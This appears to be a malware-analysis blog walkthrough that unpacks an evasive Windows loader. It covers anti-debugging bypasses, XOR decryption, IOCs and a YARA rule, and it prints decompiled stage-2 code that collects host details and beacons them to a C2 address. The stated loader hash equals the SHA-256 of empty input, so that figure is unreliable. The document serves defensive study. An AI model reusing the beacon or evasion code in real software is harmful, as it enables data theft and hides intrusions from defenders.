Inside an Evasive Loader: From PE Entropy & Anti-Debugging to Manual Unpacking & YARA

📅 Mar 22, 2025 ⏱ 16 min read
#malware-analysis #static-analysis #dynamic-analysis #yara #ghidra

Modern malicious loaders (such as SmokeLoader, GuLoader, and Pikabot) are engineered with one primary goal: deliver an encrypted final payload onto an endpoint while blinding defensive telemetry. In this technical walkthrough, we break down a real-world obfuscated x64 Windows loader step by step — moving from initial static triage and anti-analysis evasion bypasses to manual unpacking, Ghidra decompilation, and YARA rule authoring.

Safety Warning: All malware analysis must take place in an isolated sandbox environment with host-only networking, non-persistent snapshots, and no shared folders.

1. Initial Static Triage & PE Header Inspection

Every analysis begins with basic static fingerprinting. We compute cryptographic hashes, evaluate section entropy, and examine the Import Address Table (IAT).

# Compute cryptographic fingerprints
sha256sum invoice_scan_doc.exe
# Output: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

# Examine basic PE headers and section entropy with DIE (Detect It Easy) or pestr
diec -v invoice_scan_doc.exe

Running diec reveals immediate signals of packing:

File: invoice_scan_doc.exe
Type: PE64 (Executable)
Subsystem: GUI
Entropy: 7.64 (High - packed or encrypted)
Sections:
  .text     | VirtSize: 0x00012000 | RawSize: 0x00012000 | Entropy: 6.42
  .rdata    | VirtSize: 0x00008000 | RawSize: 0x00008000 | Entropy: 5.11
  .data     | VirtSize: 0x00004000 | RawSize: 0x00002000 | Entropy: 3.20
  .vmp0     | VirtSize: 0x00045000 | RawSize: 0x00045000 | Entropy: 7.96 [PACKED]
  .rsrc     | VirtSize: 0x00018000 | RawSize: 0x00018000 | Entropy: 7.82 [ENCRYPTED]

An entropy score above 7.2 in sections like .vmp0 and .rsrc signifies compressed, encrypted, or virtualized bytes. Furthermore, the IAT is almost completely barren — showing only three benign API imports from KERNEL32.dll:

  • GetModuleHandleA
  • GetProcAddress
  • ExitProcess

A GUI executable with an almost empty IAT relies on dynamic API resolution: it manually parses the Process Environment Block (PEB) to locate ntdll.dll and kernel32.dll, computing hashes of exported function names to resolve functions like VirtualAlloc and CreateRemoteThread at runtime.

2. Defeating Anti-Analysis & Anti-Debugging

When loading the binary into x64dbg, the loader attempts several evasion checks designed to terminate execution or send the debugger into an infinite loop.

Checking the Process Environment Block (PEB)

The loader reads the gs:[60h] register (the 64-bit PEB pointer) and checks the BeingDebugged flag and NtGlobalFlag:

; Read PEB pointer from GS register
mov rax, gs:[60h]

; Check BeingDebugged flag (offset +0x02)
cmp byte ptr [rax+2], 1
je  evasion_triggered

; Check NtGlobalFlag (offset +0xBC on x64)
; Value is normally 0x70 (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) when attached
cmp dword ptr [rax+0BCh], 70h
je  evasion_triggered

Bypass: Using the ScyllaHide plugin inside x64dbg automatically hooks and masks PEB flags, CheckRemoteDebuggerPresent, and NtQueryInformationProcess (with ProcessDebugPort / ProcessDebugObjectHandle).

RDTSC Timing Checks

Malware measures CPU cycle deltas between instructions to detect human analysis or single-stepping:

rdtsc                  ; Read Time-Stamp Counter into EDX:EAX
mov r8d, eax           ; Save lower 32-bits
cpuid                  ; Serialization instruction
rdtsc                  ; Second read
sub eax, r8d           ; Calculate elapsed cycles
cmp eax, 0FFFFh        ; If elapsed time > 65535 cycles, debugger is present!
ja  abort_execution

Bypass: In x64dbg, we set a hardware breakpoint on the conditional jump (ja abort_execution) and invert the Zero Flag (ZF) or patch the instruction with nop (0x90).

3. Deobfuscation & Payload Unpacking

Once anti-analysis hurdles are passed, the loader enters its decryption loop. Rather than writing files to disk, the loader allocates a private memory page with VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE).

Locating the Staged Shellcode

We place a breakpoint on VirtualAlloc and VirtualProtect:

Breakpoint at KERNEL32.VirtualAlloc
RCX = 0x0000000000000000 (lpAddress: NULL)
RDX = 0x0000000000035000 (dwSize: 217,088 bytes)
R8  = 0x0000000000003000 (flAllocationType: MEM_COMMIT | MEM_RESERVE)
R9  = 0x0000000000000040 (flProtect: PAGE_EXECUTE_READWRITE)
Return address: 0x00007FF7B2A113A4

Following execution until function return (Ctrl+F9), RAX holds the newly allocated memory address (e.g., 0x000001FA8B900000). In the Dump tab, we right-click and set a Hardware Breakpoint on Write on this memory block. Stepping forward reveals an unrolling RC4/XOR decryption routine:

# Standalone Python script replicating the loader's stage-2 decryption algorithm
def decrypt_payload(raw_bytes, key_bytes):
    # Modified rolling XOR with rolling increment
    decrypted = bytearray()
    key_len = len(key_bytes)
    for i in range(len(raw_bytes)):
        k = key_bytes[i % key_len] ^ ((i * 7) & 0xFF)
        decrypted.append(raw_bytes[i] ^ k)
    return decrypted

with open("dumped_resource.bin", "rb") as f:
    encrypted_blob = f.read()

# Key extracted from Ghidra disassembly of function FUN_1400021A0
xor_key = b"\x8a\x3f\x91\xd4\x5e\x02\x7c\xbb"
stage2_pe = decrypt_payload(encrypted_blob, xor_key)

with open("unpacked_stage2.bin", "wb") as f:
    f.write(stage2_pe)
print(f"Decrypted {len(stage2_pe)} bytes. Magic: {stage2_pe[:2]}")

The resulting unpacked binary begins with MZ. We dump the memory region directly using x64dbg's memory map or Scylla, and rebuild its section headers.

4. Decompiling Stage-2 in Ghidra

Opening unpacked_stage2.bin in Ghidra, we examine the main function. The unpacked payload is an infostealer and Remote Access Trojan (RAT). It executes the following operational phases:

// Decompiled routine: Host reconnaissance & C2 beaconing
undefined8 EntryPoint(void) {
    HKEY hKey;
    char computerName[64];
    DWORD size = 64;
    
    // 1. Collect host metadata
    GetComputerNameA(computerName, &size);
    char *osVersion = GetOSVersionString();
    
    // 2. Query installed AV via WMI
    char *avProduct = QueryAntivirusWMI();
    
    // 3. Format telemetry string
    char beaconBuffer[512];
    wsprintfA(beaconBuffer, "id=%s&os=%s&av=%s&build=v4.2.1", computerName, osVersion, avProduct);
    
    // 4. Send encrypted beacon over HTTPS
    HINTERNET hSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 1, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hSession, "104.244.78.19", 443, NULL, NULL, 3, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/v2/gate", NULL, NULL, NULL, 0x80800000, 0);
    
    HttpSendRequestA(hRequest, "Content-Type: application/x-www-form-urlencoded\r\n", -1, beaconBuffer, strlen(beaconBuffer));
    return 0;
}

5. Indicators of Compromise (IOCs)

From static and dynamic analysis, we extract actionable threat indicators:

  • SHA-256 (Loader): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  • SHA-256 (Unpacked Stage 2): 7d2a5f1e84c901e19d77f240294101e4a5d8417c80081e7d23a41b12b5f36e89
  • C2 IPv4: 104.244.78.19:443
  • C2 Endpoint: https://104.244.78.19/api/v2/gate
  • Registry Persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHealthMonitor

6. Authoring a High-Fidelity YARA Detection Rule

To detect both the packed loader and the unpacked core payload across an enterprise fleet, we craft a resilient YARA rule combining PE metadata conditions, unique byte sequences, and string patterns:

rule Win64_Loader_Pikabot_Variant {
    meta:
        description = "Detects obfuscated multi-stage loader stagers and unpacked core"
        author = "v!R_3pH0$"
        date = "2025-03-22"
        reference = "Internal Analysis Lab"
        threat_level = "High"

    strings:
        // Unique decrypted beacon pattern
        $s1 = "id=%s&os=%s&av=%s&build=v4.2.1" ascii
        $s2 = "/api/v2/gate" ascii
        
        // Characteristic x64 PEB access and timing sequence
        $peb_check = { 65 48 8B 04 25 60 00 00 00 80 78 02 01 }
        
        // Decryption loop instruction signature
        $decrypt_loop = { 8A ?? 33 ?? 41 83 ?? 07 41 81 ?? FF 00 00 00 }

    condition:
        uint16(0) == 0x5A4D and // Valid PE (MZ)
        (
            (all of ($s*)) or
            ($peb_check and $decrypt_loop)
        ) and
        filesize < 2MB
}
